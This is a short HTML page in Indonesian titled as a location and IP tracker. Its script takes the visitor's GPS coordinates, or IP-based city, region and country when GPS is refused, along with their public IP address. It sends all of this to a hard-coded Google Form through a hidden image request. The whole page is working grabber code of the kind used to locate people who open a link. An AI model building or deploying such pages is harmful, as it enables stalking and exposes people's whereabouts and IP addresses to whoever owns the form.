<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <title>Tracker Lokasi + IP</title>
</head>
<body>
  <h2>Sedang merekam lokasiâ€¦</h2>
  <script>
    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
    const F = {
      lat:  'entry.336954328',   // Latitude
      long: 'entry.122334606',   // Longitude
      acc:  'entry.1466949585',  // Accuracy
      city: 'entry.1958665783',  // City
      reg:  'entry.1713030934',  // Region
      id:   'entry.2142024660',  // Country/ID
      ip:   'entry.1095561107'   // ID field IP Address
    };

    function submit(params) {
      // trigger GET ke formResponse
      new Image().src = FORM_URL + '?' + new URLSearchParams(params);
    }

    // Ambil lokasi via Geolocation API
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        // setelah dapat GPS, ambil IP via ipify
        fetch('https://api.ipify.org?format=json')
          .then(r => r.json())
          .then(d => {
            submit({
              [F.lat]:  pos.coords.latitude,
              [F.long]: pos.coords.longitude,
              [F.acc]:  pos.coords.accuracy,
              [F.ip]:   d.ip
            });
          })
          .catch(() => {
            // kalau gagal ambil IP
            submit({
              [F.lat]:  pos.coords.latitude,
              [F.long]: pos.coords.longitude,
              [F.acc]:  pos.coords.accuracy,
              [F.ip]:   'unknown'
            });
          });
      },
      // kalau geolocation gagal atau ditolak
      _=> fallback(),
      { timeout: 8000 });
    } else {
      // browser tidak support geolocation
      fallback();
    }

    function fallback() {
      // fallback ambil IP & geo dari ipwho.is
      fetch('https://ipwho.is/json/')
        .then(r => r.json())
        .then(d => {
          submit({
            [F.lat]:  d.latitude,
            [F.long]: d.longitude,
            [F.acc]:  'IP',
            [F.city]: d.city,
            [F.reg]:  d.region,
            [F.id]:   d.country,
            [F.ip]:   d.ip
          });
        })
        .catch(() => {
          // benar-benar gagal seluruhnya
          submit({
            [F.lat]:  0,
            [F.long]: 0,
            [F.acc]:  'error',
            [F.ip]:   'error'
          });
        });
    }
  </script>
</body>
</html>
